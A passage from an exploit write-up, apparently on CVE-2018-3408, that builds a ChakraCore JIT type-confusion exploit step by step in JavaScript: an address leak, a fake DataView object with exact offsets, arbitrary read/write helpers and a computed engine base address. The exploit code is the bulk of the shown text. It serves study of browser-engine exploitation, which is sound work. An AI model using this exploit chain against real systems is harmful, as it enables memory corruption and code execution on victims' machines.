<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>//...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;                   <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};   <span style=color:#75715e>// [2]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>fake_object</span>;           <span style=color:#75715e>// [3]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>If in line <code>[3]</code> we try to assign the <code>fake_object</code> to the second element of the <code>arr</code> parameter, the object is stored in the second element and if the conversion from a <code>JavascriptNativeFloatArray</code> to a <code>JavascriptVarArray</code> hadn&rsquo;t happened, it would happen now. Subsequent access to the <code>arr[1]</code> within this function, would just return the object stored.</p><p>We know that the ChakraCore engine, when JITing functions, it makes assumptions based on the parameters it has seen over a number of calls. Let&rsquo;s now consider adding a third parameter to the <code>opt</code> function we&rsquo;ll call <code>arr2</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>, <span style=color:#a6e22e>arr2</span>) {    <span style=color:#75715e>//*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;                   <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};   <span style=color:#75715e>// [2]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr2</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>fake_object</span>;          <span style=color:#75715e>// [3]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>With the introduction of the third parameter, we also need to adjust our code which causes the <code>opt</code> function to be JITed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>arr</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>arr2</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.2</span>, <span style=color:#ae81ff>2.3</span>, <span style=color:#ae81ff>3.4</span>];          <span style=color:#75715e>// *
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, {}, <span style=color:#a6e22e>arr2</span>);              <span style=color:#75715e>// *
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Having performed the above shown changes, when <code>opt</code> is JITed, the same conversion happens. However, based on the parameters we passed, JIT will treat the <code>arr</code> and <code>arr2</code> parameters to the <code>opt</code> function as two distinct parameters. Let&rsquo;s now look at the change made to the <code>opt</code> function call which causes the type confusion.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>arr</span>);    <span style=color:#75715e>// *
</span></span></span></code></pre></div><p>As we can see above, we set the parameter <code>arr2</code> to the same <code>arr</code> array. Going back to the last change done to the <code>opt</code> function, <code>arr2</code>, which is treated as a separate array from <code>arr</code>, is converted to a <code>JavascriptVarArray</code> with the assignment of the second element to the <code>fake_object</code>. This leaves the <code>arr</code> parameter with its data not invalidated, and reading from it, will result in a <code>JavascriptNativeFloatArray</code> read. Thus, if we read the second element, which contains the address of <code>fake_object</code>, we will be reading it as a non type encoded 64-bit float. Converting this 64-bit float to a 64-bit unsigned integer, would give us a leak of the <code>fake_object</code> address. In order to get the leak, the following changes can be done to the <code>opt</code> function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>f64</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i32</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Int32Array</span>(<span style=color:#a6e22e>f64</span>.<span style=color:#a6e22e>buffer</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>, <span style=color:#a6e22e>arr2</span>) {    <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;                   <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};   <span style=color:#75715e>// [2]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>arr2</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>fake_object</span>;          <span style=color:#75715e>// [3]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>addr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>1</span>];                  <span style=color:#75715e>// [4]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>f64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>addr</span>;                  <span style=color:#75715e>// [5]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>i32</span>[<span style=color:#ae81ff>0</span>];           <span style=color:#75715e>// [6]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>base_hi</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>i32</span>[<span style=color:#ae81ff>1</span>];           <span style=color:#75715e>// [7]*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>In line <code>[4]</code> in the above snippet, we read the address of <code>fake_object</code> into the <code>addr</code> temporary variable. Note that this extraction into a temporary variable will introduce the type encoding information that is typical of 64-bit floats. This value is then stored once again into a JavascriptNativeFloatArray in line <code>[5]</code> to remove the type information. The global variable <code>i32</code> shares the same buffer with the <code>f64</code> float array. What this allows us to do is to read two 32-bit integers in lines <code>[6]</code> and <code>[7]</code> which actually make up the leaked address low and high DWORDs.</p><h3 id=fakeobject-primitive>FakeObject Primitive</h3><p>In the last section, we&rsquo;ve seen how we can leak the address of a JavaScript object; now it&rsquo;s time for us to see if we could create a memory layout which would allow us to corrupt memory. Before jumping into the code, it&rsquo;s crucial to have a basic understanding of what a JavaScript object looks like in memory, as we will use this knowledge to turn the information leak into a memory corruption.</p><p>You might wonder how we can turn this memory leak into something that allows us to compromise the JavaScript engine. Well, it&rsquo;s a not as easy as a simple buffer overflow where you get to control the instruction pointer directly. The bug we have here gives us some capabilities, but we need to do more to turn it into something powerful.</p><p>One of the techniques used in browser exploitation is the creation of a fake object in memory (in short <code>fakeobj</code>). This gives the ability to control the internal data structure of the fake object we&rsquo;re creating. The fake object primitive can be seen as the counterpart to the info leak primitive, which is also known as the address of primitive (in short <code>addrof</code>). If the info leak primitive uses this idea to read the pointer to an object in memory, the fake object primitive uses array elements with specifically chosen values to form a valid JavaScript object in memory.</p><p>In our exploit we will be using the fake object primitive to create a fake <code>DataView</code> object.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fake_object</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>opt</span>(<span style=color:#a6e22e>arr</span>, <span style=color:#a6e22e>proto</span>, <span style=color:#a6e22e>arr2</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1.1</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>__proto__</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>proto</span>};
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr2</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>fake_object</span>; <span style=color:#75715e>// 2.3023e-320;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>addr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>f64</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>addr</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>i32</span>[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>base_hi</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>i32</span>[<span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>i32</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>arr</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>f64</span>[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Type*
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x68</span>;         <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_hi</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// (TypeId for fake Type object)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>4</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>56</span>;                     <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>6</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x430</span>; <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>7</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_hi</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Buffer size
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>8</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x200</span>;                  <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ArrayBuffer pointer, +0x3C IsDetached
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x20</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>20</span>; <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>11</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_hi</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Buffer address
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>14</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x58</span>;        <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>15</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_hi</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>array_addr_hi</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_hi</span>;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>array_addr_lo</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_lo</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Looking at the code snippet above, reveals that there are some changes from the previous section on info leak. These changes in the <code>opt</code> function are necessary for the fake object primitve and can be seen as the assignments of elements in the <code>fake_object</code> array. Let&rsquo;s break them down.</p><p>First we have to understand what a <code>DataView</code> object is. The <a class=link href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView target=_blank rel=noopener>Mozilla developer website</a> states that</p><blockquote><p>The DataView view provides a low-level interface for reading and writing multiple number types in a binary ArrayBuffer, without having to care about the platform&rsquo;s endianness.</p></blockquote><p>What we can say is that the <code>DataView</code> allows us to write data to or read data from a buffer. Moreover it&rsquo;s a low-level interface which means it allows us to access the ArrayBuffer&rsquo;s binary buffer. One important note to take here is that this object contains a raw pointer to the binary buffer itself at offset 0x38.</p><p><img src=/posts/cve-2018-3408/blockdiagram.png width=1181 height=962 srcset="/posts/cve-2018-3408/blockdiagram_hu10295918747996260197.png 480w, /posts/cve-2018-3408/blockdiagram_hu11721487343037730599.png 1024w" loading=lazy alt="arr and fake_object block diagram" class=gallery-image data-flex-grow=122 data-flex-basis=294px></p><p>From the above diagram we can see that the buffer address points to a remote adderss. Now image what would happen if we were be able to control that buffer address with a pointer we desire. Starting from a valid fake <code>DataView</code> object, we would set the buffer address to point to an address we desire. By utilising native JavaScript APIs, we are able to read/write from any address we would like and corrupt any structure member from the memory freely.</p><p>Now the most important elements in a <code>DataView</code> object are the</p><ul><li><code>type</code> so that JavaScript can identify that it is an <code>DataView</code>,</li><li>the <code>typeId</code>,</li><li>a pointer called <code>JavascriptLibrary*</code> which, for exploitation purpose just needs to valid address,</li><li>the buffer size,</li><li>an ArrayBuffer, which also needs to point to a valid address in order not to crash the JavaScript engine</li><li>the Buffer Address, which is a pointer to an address we want to read from or write to</li></ul><p>From a debugger point of view, this is how our fake <code>DataView</code> object looks in memory.</p><p><img src=/posts/cve-2018-3408/fakedataview.png width=852 height=387 srcset="/posts/cve-2018-3408/fakedataview_hu14160260479981854483.png 480w, /posts/cve-2018-3408/fakedataview_hu7393384735041994830.png 1024w" loading=lazy alt="Fake DataView object" class=gallery-image data-flex-grow=220 data-flex-basis=528px></p><p>The following snippet shows an example of how we can use this fake <code>DataView</code> structure. As we shall see in the next section, the <code>read64</code> helper function, sets the <code>Buffer Address</code> element in our fake <code>DataView</code> object. By using native JavaScript APIs, we are then able to read the data at that address and leak an address within ChakraCore.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>chakra_leak</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>array_addr</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Leaked address within chakra: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>chakra_leak</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>    
</span></span></code></pre></div><h3 id=create-arbitrary-readwrite-primitive>Create Arbitrary Read/Write Primitive</h3><p>In this section we&rsquo;ll expand on our work to create an arbitrary read and write primitive. Previously, we described how FakeObject helpes us to build the base for arbitrary read/write. Since we were able to fake a <code>DataView</code> object, we are able to set any memory address as the buffer address of the <code>DataView</code> and read from or write to it, by using <code>getInt32</code> or <code>setInt32</code> respectively. This is illustrated in the image below, where we change the buffer address from it&rsquo;s original address to our chosen address.</p><p><img src=/posts/cve-2018-3408/fakedataview.png width=852 height=387 srcset="/posts/cve-2018-3408/fakedataview_hu14160260479981854483.png 480w, /posts/cve-2018-3408/fakedataview_hu7393384735041994830.png 1024w" loading=lazy alt="Changed buffer address in our fake DataView" class=gallery-image data-flex-grow=220 data-flex-basis=528px></p><p>Since we will be repeatedly reading and writing memory, it makes sense for us to create helper functions which set the buffer address and read from/write to the address. Let&rsquo;s start with the code that will handle reading from memory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>(<span style=color:#a6e22e>ud</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ud</span> <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0x80000000</span>) <span style=color:#f92672>?</span> <span style=color:#f92672>-</span>(<span style=color:#ae81ff>0x100000000</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>ud</span>) <span style=color:#f92672>:</span> <span style=color:#a6e22e>ud</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>SignedDwordToUnsignedDword</span>(<span style=color:#a6e22e>sd</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>sd</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>sd</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x100000000</span> <span style=color:#f92672>:</span> <span style=color:#a6e22e>sd</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read32</span>(<span style=color:#a6e22e>addr</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>14</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>15</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>((<span style=color:#a6e22e>addr</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>0x100000000</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>DataView</span>.<span style=color:#a6e22e>prototype</span>.<span style=color:#a6e22e>getInt32</span>.<span style=color:#a6e22e>call</span>(<span style=color:#a6e22e>dv</span>, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>addr</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>lower_dword</span>  <span style=color:#f92672>=</span> <span style=color:#a6e22e>read32</span>(<span style=color:#a6e22e>addr</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>higher_dword</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read32</span>(<span style=color:#a6e22e>addr</span><span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>value</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>SignedDwordToUnsignedDword</span>(<span style=color:#a6e22e>lower_dword</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>value</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>SignedDwordToUnsignedDword</span>(<span style=color:#a6e22e>higher_dword</span>) <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100000000</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>value</span>;
</span></span><span style=display:flex><span>}   
</span></span></code></pre></div><p>Breaking down the above code we see first of all two functions, <code>UnsignedDwordToSignedDword</code> and <code>SignedDwordToUnsignedDword</code>, which convert from signed integers to unsigned integers and vice-versa. This is to go around the limitations discussed in the first section. Next we find <code>read32</code>, where we set buffer address to the high dword and low dword which is our desired address, and call <code>getInt32</code> to read 4 bytes from that address. Finally we see <code>read64</code> which is a wrapper around <code>read32</code>, performing 2 consecutive reads, thus act as if we read 8 consecutive bytes.</p><p>Going back to the example we shared earlier, we can now better understand what the following code is doing.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>chakra_leak</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read64</span>(<span style=color:#a6e22e>array_addr</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Leaked address within chakra: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>chakra_leak</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span></code></pre></div><p>Once the above code is executed, the first entry in the vtable is returned. In programming languages such as C++, the language in which the ChakraCore JavaScript engine is written in, the vtable contains addresses to an object&rsquo;s methods. This is especially useful when inheritance is used, as a subclass might override some of its parent class methods. The instantiated object would need to have a reference to the appropriate method implementations when the object methods are invoked.</p><p>From the above brief interlude on vtables, we know that the vtable contains a list of methods typically present in the binary, thus reading from the vtable we can leak an address within ChakraCore.</p><p><img src=/posts/cve-2018-3408/chakracoreleak.png width=863 height=312 srcset="/posts/cve-2018-3408/chakracoreleak_hu10281196523916015015.png 480w, /posts/cve-2018-3408/chakracoreleak_hu15204043181835345226.png 1024w" loading=lazy alt="Leaked address in ChakraCore" class=gallery-image data-flex-grow=276 data-flex-basis=663px></p><p>Based on this leaked address, we can very simply get to the ChakraCore base address in memory as the leaked address is at a constant offset from the ChakraCore base address.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>chakracore_base</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chakra_leak</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x5d9a80</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>print</span>(<span style=color:#e6db74>&#34;[+] Chakra base: 0x&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>chakracore_base</span>.<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>16</span>));
</span></span></code></pre></div><p>For the arbitrary write we used a very similar approach. Let&rsquo;s start by inspecting the following code snippet</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#a6e22e>value</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>14</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>(<span style=color:#a6e22e>addr</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fake_object</span>[<span style=color:#ae81ff>15</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>((<span style=color:#a6e22e>addr</span> <span style=color:#f92672>/</span> <span style=color:#ae81ff>0x100000000</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>DataView</span>.<span style=color:#a6e22e>prototype</span>.<span style=color:#a6e22e>setInt32</span>.<span style=color:#a6e22e>call</span>(<span style=color:#a6e22e>dv</span>, <span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>value</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write64</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#a6e22e>value</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>write32</span>(<span style=color:#a6e22e>addr</span>, <span style=color:#a6e22e>UnsignedDwordToSignedDword</span>(<span style=color:#a6e22e>value</span> <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFF</span>));
